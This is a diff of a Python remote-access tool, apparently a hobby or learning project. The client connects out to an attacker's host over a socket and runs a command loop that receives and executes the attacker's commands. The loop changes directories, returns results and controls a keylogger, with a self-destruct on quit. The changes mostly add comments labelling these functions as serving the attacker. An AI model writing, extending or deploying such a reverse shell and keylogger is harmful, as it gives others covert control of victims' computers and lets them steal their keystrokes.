@@ -15,9 +15,12 @@ client = socket.socket()
 client.connect((ip, port))
 print("connected")
 
+#send response back to attacker
 def send_response(data):
     jsondata = json.dumps(data)
     client.send(jsondata.encode())
+
+#receive command from attacker
 def receive_command():
     data = ''
     while True:
@@ -27,25 +30,26 @@ def receive_command():
         except ValueError:
             continue
 
+#interpret commands from attacker
 def execute_shell():
     while True:
         command = receive_command()
-
         print(f"command received: {command}")
-
         if command == 'quit':
             try: keylog.self_destruct()
             except: pass
             send_response("disconnected")
             break
+
         elif command[:2] == 'cd':
             try:
+                #change to the dir in the second part of the command
                 os.chdir(command[3:])
 
             except:#there wasn't anything after "cd"
                 pass
                 
-            finally:
+            finally:#send the current working directory
                 send_response(os.getcwd())
 
         elif command[:12] == 'keylog_start':
